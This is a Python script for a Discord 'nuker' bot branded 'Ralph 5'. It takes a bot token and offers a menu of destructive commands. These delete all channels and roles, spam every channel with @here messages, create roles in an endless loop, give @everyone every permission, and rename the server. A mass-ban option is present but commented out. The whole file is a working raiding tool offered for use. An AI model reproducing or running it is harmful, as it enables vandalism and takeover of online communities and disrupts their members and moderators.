import discord
import os
from discord.ext import commands
import time
from threading import Thread
from threading import Timer
from discord import Permissions
client = commands.Bot(command_prefix='', help_command=None)
def tukopl():
    print("""
    
██████╗░░█████╗░██╗░░░░░██████╗░██╗░░██╗  ███████╗
██╔══██╗██╔══██╗██║░░░░░██╔══██╗██║░░██║  ██╔════╝
██████╔╝███████║██║░░░░░██████╔╝███████║  ██████╗░
██╔══██╗██╔══██║██║░░░░░██╔═══╝░██╔══██║  ╚════██╗
██║░░██║██║░░██║███████╗██║░░░░░██║░░██║  ██████╔╝
╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝░░╚═╝  ╚═════╝░
    """)
    time.sleep(2)
    print("""
    The more silent you are the more you can here -Kali Tm
    """)
    def buk():
        try:
            os.system("clear")
        except:
            pass
        TOKEN = input('whats the discord token?:')

        def letsgo():
            print("""
            ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░  ██████╗░██╗░░░██╗  ███╗░░░███╗░█████╗░███╗░░██╗░█████╗░██╗░░░██╗
            ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗  ██╔══██╗╚██╗░██╔╝  ████╗░████║██╔══██╗████╗░██║██╔══██╗██║░░░██║
            ██╔██╗██║██║░░░██║█████═╝░█████╗░░██║░░██║  ██████╦╝░╚████╔╝░  ██╔████╔██║███████║██╔██╗██║███████║╚██╗░██╔╝
            ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██║░░██║  ██╔══██╗░░╚██╔╝░░  ██║╚██╔╝██║██╔══██║██║╚████║██╔══██║░╚████╔╝░
            ██║░╚███║╚██████╔╝██║░╚██╗███████╗██████╔╝  ██████╦╝░░░██║░░░  ██║░╚═╝░██║██║░░██║██║░╚███║██║░░██║░░╚██╔╝░░
            ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═════╝░  ╚═════╝░░░░╚═╝░░░  ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░░░╚═╝░░░
            """)
            time.sleep(2)

            def kml():
                print("what u wanna do?")
                print("[A] Remove all the channels?")
                print("[B] Spam messages?")
                print("[C] Ban people? (beta)")
                print("[D] Delete roles?")
                print("[E] Spam roles?")
                print("[F] Give all admin?")
                print("[G] Rename server name?")
                print("[H] Restart the script?")
                print("[I] Exit")
                print("[J] Spam channels?")
                print("Answer in caps from A-J")
                shesh = input("so what is it?")
                if shesh == 'A':
                    print("say com1 in the chat where bot is present to start it")
                    try:
                        @client.command()
                        async def com1(ctx):
                            print("starting to remove channels")
                            for chan in ctx.guild.channels:
                                try:
                                    await chan.delete()  # deletes all channel#
                                except:
                                    pass
                                    print(f"{chan} this is the channel or catagory i cant remove")
                            for i in range(1):
                                await ctx.guild.create_text_channel('Ralph 5 on the go')
                            kml()
                    except:
                        return
                elif shesh == 'B':
                    print("Starting to spam in all channels i can")
                    print("wait a min")
                    print("Do u wanna spam the default or custom?")
                    print("[A] Custom")
                    print("[B] Default message?")
                    jmk = input("Answer in caps and say weather is it A or B: ")
                    if jmk == 'A':
                        SPAM_MESSAGE = input("what you wanna spam?: ")
                        print(
                            "If u see the channel where the messages is not comming. Its because bot dosent have permission to send in the server")
                        print("say com2 in chat where is bot to present to start the function")
                        try:
                            @client.command()
                            async def com2(ctx):
                                for chan in ctx.guild.channels:
                                    try:
                                        await chan.send(SPAM_MESSAGE)
                                    except:
                                        pass
                                kml()
                        except:
                            return
                    elif jmk == 'B':
                        print("if messages is not comming some channels it means that bot dooscpnt have permission to send in the particular channel")
                        print("say com3 in chat where is bot to present to start the function")
                        try:
                            @client.command()
                            async def com3(ctx):
                                for chan in ctx.guild.channels:
                                    try:
                                        await  chan.send("""
                                                @here
                                                Ralph 5 was here
                                                """)
                                    except:
                                        pass
                                kml()
                        except:
                            return
                    elif jmk == jmk:
                        kml()
                elif shesh == 'C':
                    print("This function is on beta so not available right now")
                    time.sleep(2)
                    #print("Banning people")
                    #okl = input("please give me you account id using developer mode so that i don't ban u: ")
                    #okh = input("please the bot id: ")
                    #print("say com4 in the chat to start this function")
                    #try:
                        #@client.command()
                        #async def com4(ctx):
                            #for members in ctx.guild.members:
                                #try:
                                    #if members == okl:
                                        #pass
                                    #elif members == okh:
                                        #pass
                                    #else:
                                        #await members.ban()
                                #except Exception as o:
                                    #print(f"cant ban {members} {o}")
                            #kml()
                    #except:
                        #return
                    kml()
                elif shesh == 'D':
                    print("starting to delete roles")
                    print("say com5 in the chat to start this function")
                    try:
                        @client.command()
                        async def com5(ctx):
                            for i in range(1):
                                for op in ctx.guild.roles:
                                    try:
                                        await op.delete()
                                    except:
                                        print(f"i was not able to remove {op} *sadness*")
                                        pass
                                kml()
                    except:
                        return
                elif shesh == 'E':
                    print("creating roles")
                    print("Do u wanna spam custom roles or default roles?")
                    print("[A] Custom")
                    print("[B] Default")
                    print("Type the option in caps and make sure its A or B")
                    omh = input("so whats ur thoughts?: ")
                    if omh == 'A':
                        okl = input("what shall be the role name?: ")
                        print("say com6 in the discord chat to start this function")
                        try:
                            @client.command()
                            async def com6(ctx):
                                moj = ctx.guild
                                try:
                                    while True:
                                        await moj.create_role(name=okl)  # spam the roles#
                                except:
                                    print("server is full on roles")
                            kml()
                        except:
                            return
                    elif omh == 'B':
                        print("say com7 in discord chat to start this function")
                        try:
                            @client.command()
                            async def com7(ctx):
                                moj = ctx.guild
                                try:
                                    while True:
                                        await moj.create_role(name='Ralph 5')  # spam the roles#
                                except:
                                    print("server is full on roles")
                            kml()
                        except:
                            return
                    elif omh == omh:
                        kml()
                elif shesh == 'F':
                    print("Giving everyone admin")
                    print("say com8 in discord server chat to start this function")
                    try:
                        @client.command()
                        async def com8(ctx):
                            mko = ctx.guild
                            try:
                                role = discord.utils.get(mko.roles, name="@everyone")
                                await role.edit(permissions=Permissions.all())
                                print("gave everyone admin lul")
                            except:
                                print("cant give all admin but its ok!")
                        kml()
                    except:
                        return
                elif shesh == 'G':
                    print("Renaming server name")
                    print("Do u wanna put custom server name?")
                    print("[A] Custom")
                    print("[B] Default")
                    print("Type the option in caps and make sure its A or B")
                    klm = input("so whats ur thought on?: ")
                    if klm == 'A':
                        try:
                            shj = input("what shall be the server name?: ")
                            print("say com9 in discord server to start this function")
                            @client.command()
                            async def com9(ctx):
                                try:
                                    await ctx.guild.edit(name=shj)
                                except:
                                    print("cant rename server")
                                kml()
                        except:
                            return
                    elif klm == 'B':
                        print("say com10 in discord server chat to start this function")
                        try:
                            @client.command()
                            async def com10(ctx):
                                try:
                                    await ctx.guild.edit(name="Ralph 5 was here")
                                except:
                                    print("cant rename server")
                                kml()
                        except:
                            return
                    elif klm == klm:
                        kml()
                elif shesh == 'H':
                    try:
                        print("Restarting script")
                        time.sleep(2)
                        tukopl()
                    except:
                        return
                elif shesh == 'I':
                    print("Stopping the code")
                    kmj = input("Are u sure u wanna exit? [y/n] ")
                    if kmj == 'y' or kmj == 'Y' or kmj == 'yes':
                        print("ok")
                        quit()
                    elif kmj == 'n' or kmj == 'N' or kmj == 'no':
                        print("ok")
                        buk()
                elif shesh == shesh:
                    print("no such options like that")
                    print("look care fully")
                    kml()
            kml()
        letsgo()
        client.run(TOKEN)
    buk()
tukopl()